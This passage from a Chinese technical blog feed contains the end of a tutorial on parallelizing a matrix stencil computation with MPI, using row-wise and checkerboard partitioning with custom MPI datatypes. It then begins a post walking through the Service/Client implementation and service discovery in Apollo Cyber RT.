class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">double</span> *A, *B, *B2;<br><span class="hljs-comment">// malloc A, B, B2 with N*N*sizeof(double)</span><br><span class="hljs-comment">// init MPI</span><br><span class="hljs-type">int</span> id_procs, num_procs, num_1;<br>MPI_Status status;<br>MPI_Init(&amp;argc, &amp;argv);<br>MPI_Comm_size(MPI_COMM_WORLD, &amp;num_procs);<br>MPI_Comm_rank(MPI_COMM_WORLD, &amp;id_procs);<br><br>num_1 = num_procs <span class="hljs-number">-1</span>;<br><span class="hljs-comment">// Proc#N-1 randomize the data, and compute B2 for verification</span><br><span class="hljs-keyword">if</span> (id_procs == num_1) &#123;<br>  random_array(A, N*N);<br>  comp(A, B2, N*N);<br>&#125;<br><span class="hljs-comment">// wait Proc#N-1 for computing</span><br>MPI_Barrier(MPI_COMM_WORLD);<br></code></pre></td></tr></table></figure><p>随后，开始真正的并行计算：先让拥有数据的线程将数据广播到相应的线程中。注意，根据图上的示例，需要发送连续的三层数据。需要注意到，N 不一定能整除 (num_procs-1)，需要考虑留下的余数。<code>ctn</code> 变量记录收到数据的份数，表明了后面的计算需要循环的次数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ********************************************* //</span><br><span class="hljs-comment">// Parallel Computing Part</span><br><span class="hljs-comment">// Proc#N-1 broadcast 3 lines of A to each Proc</span><br><span class="hljs-type">int</span> ctn = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N<span class="hljs-number">-2</span>; i++) &#123;<br>  <span class="hljs-keyword">if</span> (id_procs == num_1) &#123;<br>    <span class="hljs-type">int</span> dest = i % num_1;<br>    <span class="hljs-type">int</span> tag = i / num_1;<br>    MPI_Send(&amp;A[INDEX(i, <span class="hljs-number">0</span>)], N*<span class="hljs-number">3</span>, MPI_DOUBLE, dest, tag, MPI_COMM_WORLD);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (N<span class="hljs-number">-2</span>)/num_1; i++) &#123;<br>  <span class="hljs-keyword">if</span> (id_procs != num_1) &#123;<br>    MPI_Recv(&amp;A[INDEX(<span class="hljs-number">3</span>*ctn, <span class="hljs-number">0</span>)], <span class="hljs-number">3</span>*N, MPI_DOUBLE, num_1, ctn, MPI_COMM_WORLD, &amp;status);<br>    ctn++;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (id_procs &lt; (N<span class="hljs-number">-2</span>) % num_1) &#123;<br>  MPI_Recv(&amp;A[INDEX(ctn*<span class="hljs-number">3</span>, <span class="hljs-number">0</span>)], <span class="hljs-number">3</span>*N, MPI_DOUBLE, num_1, ctn, MPI_COMM_WORLD, &amp;status);<br>  ctn++;<br>&#125;<br></code></pre></td></tr></table></figure><p>分发数据完成！接下来就是每个线程的计算部分。这里的实现和串行程序十分类似。注意，<code>ctn</code> 变量记录了该线程受到了几组数据，因此外层循环需要循环 <code>ctn</code> 次：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// compute</span><br><span class="hljs-keyword">if</span> (id_procs != num_1) &#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= ctn; i++) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; N<span class="hljs-number">-1</span>; j++) &#123;<br>      B[INDEX(i, j)] = (A[INDEX(i<span class="hljs-number">-1</span>, j)]+A[INDEX(i, j+<span class="hljs-number">1</span>)]+A[INDEX(i+<span class="hljs-number">1</span>, j)]+A[INDEX(i, j<span class="hljs-number">-1</span>)]) / <span class="hljs-number">4.0</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>把计算得到的矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>全都发给 Proc#num-1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Gather</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N<span class="hljs-number">-2</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (id_procs == num_1) &#123;<br>        <span class="hljs-type">int</span> src = i % num_1;<br>        MPI_Recv(&amp;B[INDEX(i+<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)], N<span class="hljs-number">-2</span>, MPI_DOUBLE, src, i/num_1+N, MPI_COMM_WORLD, &amp;status);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; ctn; j++)<br>            MPI_Send(&amp;B[INDEX(j+<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)], N<span class="hljs-number">-2</span>, MPI_DOUBLE, num_1, j+N, MPI_COMM_WORLD);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="棋盘划分">棋盘划分</h2><h3 id="方法概要-2">方法概要</h3><p>先以<strong>块棋盘划分</strong>来实现并行。在程序片段中，矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 的有效结果范围为 [1~N-2, 1~N-2] 。若将矩阵 B 按如下示意图划分为棋盘状，每个小格子由一个处理器单独完成（以下就用“格子”数据类型称呼它们）。</p><center><img src="/img/PP/tables.png" /></center><p>此时，程序需要完成以下步骤：</p><ol><li>在某个处理器中生成随机数据。为方便，这次选择编号0的处理器生成随机数据。</li><li>将生成的随机数据分发给不同的处理器。按照总共有的处理器数量，合理分配每行处理器的数量以及总行数，分配完成后，将随机数据发给不同的处理器。遇到余数的问题，用补 0 对齐的方法解决（虚线表示）。</li><li>各个处理器计算自己“格子”内的数据</li><li>将计算好的结果从各个处理器发出，由编号0的处理器收集整理。</li></ol><h3 id="细节处理-2">细节处理</h3><p>除了之前在行连续划分中提到的外，还要特别注意到：棋盘划分出的“格子”在一维数组中是<strong>不连续的</strong>。把一个格子发送给某个处理器，如果不采用一些小技巧，是很难做到的（你需要一个循环，并计算格子中每一行的索引），但如果使用 MPI 提供的创建数据类型功能，就很容易办到。通过下面的三条语句，就可以轻松地创建出类型为“格子”的数据类型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">MPI_Datatype SubMat;<br>MPI_Type_vector(a+<span class="hljs-number">2</span>, b+<span class="hljs-number">2</span>, N, MPI_DOUBLE, &amp;SubMat);<br>MPI_Type_commit(&amp;SubMat);<br></code></pre></td></tr></table></figure><p>对于矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 来说，一个处理器所需要的数据，即所谓的棋盘格子，事实上就是一个有 <code>a+2</code> 个数据段，每个段长度为 <code>b+2</code> ，段与段之间相隔 <code>N</code> 个单位的“结构体”，使用 <code>MPI_Type_vector</code> 函数就可以轻松描述它，如果你想了解更多，请参考 <a href="https://www.mpich.org/static/docs/latest/">MPICH 官网</a>。</p><h3 id="部分代码解析-2">部分代码解析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">double</span> *A, *B, *B2;<br><span class="hljs-comment">// init MPI as usual</span><br><span class="hljs-type">int</span> id_procs, num_procs;MPI_Status status;<br>MPI_Init(&amp;argc, &amp;argv);<br>MPI_Comm_size(MPI_COMM_WORLD, &amp;num_procs);<br>MPI_Comm_rank(MPI_COMM_WORLD, &amp;id_procs);<br></code></pre></td></tr></table></figure><p>创建新的数据类型，用于描述前面提到的“格子”。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> rows = <span class="hljs-built_in">sqrt</span>(num_procs);<br><span class="hljs-type">int</span> cols = num_procs / rows;<br><span class="hljs-type">int</span> a = (N<span class="hljs-number">-2</span> + rows<span class="hljs-number">-1</span>) / rows;<br><span class="hljs-type">int</span> b = (N<span class="hljs-number">-2</span> + cols<span class="hljs-number">-1</span>) / cols;<br><span class="hljs-type">int</span> alloc_num = (a+<span class="hljs-number">1</span>)*(b+<span class="hljs-number">1</span>)*num_procs;<br><br><span class="hljs-comment">/* Proc#0 randomize the data */</span><br><span class="hljs-comment">/* ..... */</span><br><span class="hljs-comment">// Proc#0 broadcast (a+2)x(b+2) mat</span><br>MPI_Datatype SubMat;<br>MPI_Type_vector(a+<span class="hljs-number">2</span>, b+<span class="hljs-number">2</span>, N, MPI_DOUBLE, &amp;SubMat);<br>MPI_Type_commit(&amp;SubMat);<br></code></pre></td></tr></table></figure><p>有了这个数据类型，就不需要纠结于繁琐的边界问题，按照索引计算规则，直接将矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 切割好发送出去。当然索引计算什么的仍然很不友好 :sweat:，不过接收方的代码确实简单不少。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (id_procs == <span class="hljs-number">0</span>) &#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rows; i++) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; cols; j++) &#123;<br>      <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> &amp;&amp; j == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">continue</span>;<br>      MPI_Send(A+i*a*N+b*j, <span class="hljs-number">1</span>, SubMat, j+cols*i, <span class="hljs-number">0</span>, MPI_COMM_WORLD);<br>    &#125;<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  MPI_Recv(A, <span class="hljs-number">1</span>, SubMat, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, MPI_COMM_WORLD, &amp;status);<br>&#125;<br></code></pre></td></tr></table></figure><p>开始计算，这边的计算完全和串行程序一致，因为我们只是将矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 变小了而已。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// compute same as the single version</span><br>comp(A, B, a, b);<br></code></pre></td></tr></table></figure><p>收集计算好的数据。注意到，此时数据类型变化了，因为矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 的格子比<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>的要大一圈，用一个数据类型就无法描述了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Gather result</span><br>MPI_Datatype SubMat_B;<br>MPI_Type_vector(a, b, N, MPI_DOUBLE, &amp;SubMat_B);<br>MPI_Type_commit(&amp;SubMat_B);<br><span class="hljs-keyword">if</span> (id_procs == <span class="hljs-number">0</span>) &#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rows; i++) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; cols; j++) &#123;<br>      <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> &amp;&amp; j == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">continue</span>;<br>      MPI_Recv(&amp;B[INDEX(a*i+<span class="hljs-number">1</span>, b*j+<span class="hljs-number">1</span>)], <span class="hljs-number">1</span>, SubMat_B, i*cols+j, <span class="hljs-number">1</span>, MPI_COMM_WORLD, &amp;status);<br>    &#125;<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-type">int</span> x = id_procs / cols;<br>  <span class="hljs-type">int</span> y = id_procs % cols;<br>  MPI_Send(&amp;B[INDEX(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)], <span class="hljs-number">1</span>, SubMat_B, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, MPI_COMM_WORLD);<br>&#125;<br></code></pre></td></tr></table></figure><p>当然，还有很多不同的做法：可以使用 <code>MPI_Pack</code> 函数对“格子”类型的数据进行打包；也可以用面向对象的思想，直接封装一个 class ；当然也可以用循环这种最笨拙的办法传递“格子”</p><p>我的代码实现见 <a href="https://github.com/dingfen/ParallelComputing/tree/master/PP_02">github 仓库</a>。</p><head>    <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>    <script type="text/x-mathjax-config">        MathJax.Hub.Config({            tex2jax: {            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],            inlineMath: [['$','$']]            }        });    </script></head>]]></content>
    
    
    <categories>
      
      <category>Parallel Computing</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MPI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apollo Cyber RT 服务与服务发现</title>
    <link href="/2020/11/18/2020-11-18-CyberServiceDiscovery/"/>
    <url>/2020/11/18/2020-11-18-CyberServiceDiscovery/</url>
    
    <content type="html"><![CDATA[<h1>Apollo Cyber 服务与服务发现</h1><h2 id="前言">前言</h2><p>现在我们开始介绍 Cyber RT 通信部分的最后一块内容——服务发现。在 <a href="https://dingfen.github.io/apollo/2020/11/03/CyberCommu1.html">Cyber RT 通信（上）</a>中，我说过，Cyber RT 支持两种通信方式：</p><ul><li><strong>发布—订阅通信方式</strong>（Publish-Subscribe），也叫基于信道的通信方式</li><li><strong>服务—客户通信方式</strong>（Service-Client），也叫基于服务的通信方式</li></ul><p>在 <a href="https://dingfen.github.io/apollo/2020/11/03/CyberCommu1.html">Cyber RT 通信（上）</a>和 <a href="https://dingfen.github.io/apollo/2020/11/07/CyberCommu2.html">Cyber RT 通信（下）</a>中，我已经详细地介绍了发布—订阅通信方式，之所以先对该发布—订阅方式进行介绍，是因为该方式使用的场景比较多。考虑到对系统认识的完整性以及后面的研究工作，我觉得还是有必要说一下服务—客户通信方式。</p><p>与发布—订阅方式最大的不同是，服务—客户通信方式需要两个节点之间完成<strong>请求（Request）和应答（Response）<strong>才可完成通信，常用于节点之间</strong>双向</strong>通信的场景。</p><p>回顾在<a href="https://dingfen.github.io/apollo/2020/11/03/CyberCommu1.html">Cyber RT 通信（上）</a>讲过的底层通信方式，一共有如下三种</p><ul><li><strong>同一进程内</strong>。在同一个进程节点之间的相互通信，对于进程内的数据，<strong>直接传递消息对象的指针</strong>，避免消息数据复制的开销</li><li><strong>同主机进程间</strong>。在不同进程之间的节点传播信息，可以利用<strong>共享内存传输</strong>，减少传输中的数据复制，显著提升传输效率，并满足一对多的传输场景</li><li><strong>跨主机</strong>。跨主机的数据利用 socket 传输，跨主机通信采用了第三方的开源库 <a href="https://www.eprosima.com/index.php/resources-all/rtps">Fast RTPS</a>（Real Time Publish Subscribe Protocol，实时发布订阅协议），是 DDS（Data Distribution Service）标准的一个非常流行的开源实现，支持 RTPS 协议版本的一个订阅发布消息组件，具有高性能，实时性高，多平台支持等优点</li></ul><p>在服务—客户通信方式中，使用的是第三种通信渠道—— Fast RTPS ，之后会进行介绍。</p><h2 id="从-NodeServiceImpl-说起">从 NodeServiceImpl 说起</h2><p>如果你看过我之前写的博客，就应该知道 <code>Node</code> 类通过 <code>NodeServiceImpl</code> 类来创建 <code>Service</code> 和 <code>Client</code> ，我们以 <code>Service</code> 类为例，其创建过程如下：</p><ol><li>直接创建 <code>Service</code> 对象，并进行初始化 <code>Init()</code></li><li>将创建好的 <code>Service</code> 指针放入到数组 <code>serivce_list_</code> 中，并注册名字获得 id</li><li>调用服务发现的拓扑管理类 <code>service_discovery::TopologyManager</code> 中的 <code>Join()</code> 函数，将其加入到整个服务发现的拓扑结构中</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Request, <span class="hljs-keyword">typename</span> Response&gt;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">NodeServiceImpl::CreateService</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; service_name,</span></span><br><span class="hljs-params"><span class="hljs-function"> <span class="hljs-type">const</span> <span class="hljs-keyword">typename</span> Service&lt;Request, Response&gt;::ServiceCallback&amp; service_callback)</span></span><br><span class="hljs-function"> -&gt; <span class="hljs-keyword">typename</span> std::shared_ptr&lt;Service&lt;Request, Response&gt;&gt; </span>&#123;<br>  <span class="hljs-keyword">auto</span> service_ptr = std::make_shared&lt;Service&lt;Request, Response&gt;&gt;(<br>     node_name_, service_name, service_callback);<br>  <span class="hljs-built_in">RETURN_VAL_IF</span>(!service_ptr-&gt;<span class="hljs-built_in">Init</span>(), <span class="hljs-literal">nullptr</span>);<br><br>  service_list_.<span class="hljs-built_in">emplace_back</span>(service_ptr);<br>  attr_.<span class="hljs-built_in">set_service_name</span>(service_name);<br>  <span class="hljs-keyword">auto</span> service_id = common::GlobalData::<span class="hljs-built_in">RegisterService</span>(service_name);<br>  attr_.<span class="hljs-built_in">set_service_id</span>(service_id);<br>  service_discovery::TopologyManager::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">service_manager</span>()-&gt;<span class="hljs-built_in">Join</span>(<br>      attr_, RoleType::ROLE_SERVER);<br>  <span class="hljs-keyword">return</span> service_ptr;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建 <code>Client</code> 的过程与 <code>Service</code> 极为相似，这里不过多介绍。接下来，我们不妨从以上三步出发，仔细盘一盘 <code>Service</code> 和 <code>Client</code> 类的实现过程，进而理解一下服务发现的功能。</p><h2 id="Service-Client">Service &amp; Client</h2><h3 id="Service">Service</h3><p>先来看看它的构造函数以及它们的成员。<code>Service</code> 模板类继承了 <code>ServiceBase</code> 类，此类只包含了一个服务名称，算是一个实现 <code>Service</code> 类的接口。在构造函数中，<code>Service</code> 接收三个参数，一个是所在节点的名称，一个是通信服务的名称，最后一个是服务的回调函数，在接收到消息后执行。关于 <code>Service</code> 具体的成员，还请仔细看一下下面的代码:point_down:，为了简洁，我删去了不少多线程相关的变量。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">Service</span>(<span class="hljs-type">const</span> std::string&amp; node_name, <span class="hljs-type">const</span> std::string&amp; service_name, <br>        <span class="hljs-type">const</span> ServiceCallback&amp; service_callback)<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Request, <span class="hljs-keyword">typename</span> Response&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Service</span> : <span class="hljs-keyword">public</span> ServiceBase &#123;<br>  <span class="hljs-keyword">private</span>:<br>  std::string node_name_;<span class="hljs-comment">// 创建服务的节点名称</span><br>  ServiceCallback service_callback_;<span class="hljs-comment">// 服务的回调函数</span><br>  std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">const</span> std::shared_ptr&lt;Request&gt;&amp;,<br>          <span class="hljs-type">const</span> transport::MessageInfo&amp;)&gt; request_callback_; <span class="hljs-comment">// 请求回调函数</span><br>  std::shared_ptr&lt;transport::Transmitter&lt;Response&gt;&gt; response_transmitter_; <span class="hljs-comment">// 应答的写者</span><br>  std::shared_ptr&lt;transport::Receiver&lt;Request&gt;&gt; request_receiver_;  <span class="hljs-comment">// 请求的读者</span><br>  std::string request_channel_;<span class="hljs-comment">// 请求“信道”</span><br>  std::string response_channel_;<span class="hljs-comment">// 应答“信道”</span><br>  std::thread thread_;  <span class="hljs-comment">// 线程</span><br>  std::list&lt;std::function&lt;<span class="hljs-type">void</span>()&gt;&gt; tasks_;  <span class="hljs-comment">// 任务队列</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>啊哈，在<a href="https://dingfen.github.io/apollo/2020/11/07/CyberCommu2.html">上篇博客</a>我说过，<code>Reader</code> 和 <code>Writer</code> 的底层实现是 <code>Receiver</code> 和 <code>Transmitter</code> ，从包含类的成员来看，<code>Service</code> 和 <code>Client</code> 的底层也是靠 <code>Receiver</code> 和 <code>Transmitter</code> 实现的。所以说，我之前博客里大书特书的订阅—发布通信模式，其底层的通信办法与服务—客户通信方式还是一致的。<code>Reader</code> 创建时用的信道，和这里 <code>Service</code> 中的“信道”，其实本质是一样的，它们都是<strong>字符串</strong>，在系统中充当消息传递的“桥梁”，当然为作区分以及避免误解，我在 <code>Service</code> 这边的“信道”打个引号。同时，<code>Service</code> 这边有线程也有任务队列，意味着消息会在 <code>Service</code> 内部得到处理，不需要理会调度器，也不需要使用那边的协程。</p><p>再来瞧一瞧 <code>Service::Init()</code>  函数，它在构造函数完成后，立刻被调用执行。因为代码有点长，我将不重要的部分略去，突出重点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">bool</span> Service&lt;Request, Response&gt;::<span class="hljs-built_in">Init</span>() &#123;<br>  <span class="hljs-comment">/*  RoleAttribute 的赋值 初始化  */</span><br>  <span class="hljs-keyword">auto</span> transport = transport::Transport::<span class="hljs-built_in">Instance</span>();<br>  response_transmitter_ =<br>      transport-&gt;<span class="hljs-built_in">CreateTransmitter</span>&lt;Response&gt;(role, proto::OptionalMode::RTPS);<br>  request_callback_ =<br>      std::<span class="hljs-built_in">bind</span>(&amp;Service&lt;Request, Response&gt;::HandleRequest, <span class="hljs-keyword">this</span>,<br>                std::placeholders::_1, std::placeholders::_2);<br>  <span class="hljs-comment">/*  ....  */</span><br>  request_receiver_ = transport-&gt;<span class="hljs-built_in">CreateReceiver</span>&lt;Request&gt;(<br>      role,<br>      [=](<span class="hljs-type">const</span> std::shared_ptr&lt;Request&gt;&amp; request,<br>          <span class="hljs-type">const</span> transport::MessageInfo&amp; message_info,<br>          <span class="hljs-type">const</span> proto::RoleAttributes&amp; reader_attr) &#123;<br>        (<span class="hljs-type">void</span>)reader_attr;<br>          <span class="hljs-comment">// 创建 task 函数</span><br>        <span class="hljs-keyword">auto</span> task = [<span class="hljs-keyword">this</span>, request, message_info]() &#123;<br>          <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">HandleRequest</span>(request, message_info);<br>        &#125;;<br>          <span class="hljs-comment">// 将其放入任务队列</span><br>        <span class="hljs-built_in">Enqueue</span>(std::<span class="hljs-built_in">move</span>(task));<br>      &#125;,<br>      proto::OptionalMode::RTPS);<br>  thread_ = std::<span class="hljs-built_in">thread</span>(&amp;Service&lt;Request, Response&gt;::Process, <span class="hljs-keyword">this</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>仔细梳理一下，<code>Init()</code> 函数一共做了：</p><ol><li><p>判断是否已经初始化，若没有，继续往下做，将 RoleAttribute 的值填充好，略去不说</p></li><li><p>获得 <code>Transport</code> 全局对象（该类我已经在<a href="https://dingfen.github.io/apollo/2020/11/07/CyberCommu2.html#transport">这里</a>讨论过了），并创建 <code>Transmitter</code> 对象</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">CreateTransmitter</span>&lt;Response&gt;(role, proto::OptionalMode::RTPS);<br></code></pre></td></tr></table></figure><p>注意到，这边的通信渠道选择的是 RTPS，意味着在服务—客户通信方式中，底层使用的都是 <strong>Fast RTPS 协议</strong>进行通信。</p></li><li><p>创建请求回调函数。请求回调函数，与 <code>HandleRequest</code> 函数做了绑定，我猜测 <code>Service</code> 在接收到服务请求后，就会调用这个函数进行处理。</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">std::<span class="hljs-built_in">bind</span>(&amp;Service&lt;Request, Response&gt;::HandleRequest, <span class="hljs-keyword">this</span>,<br>      std::placeholders::_1, std::placeholders::_2);<br></code></pre></td></tr></table></figure></li><li><p>最复杂的来了，创建 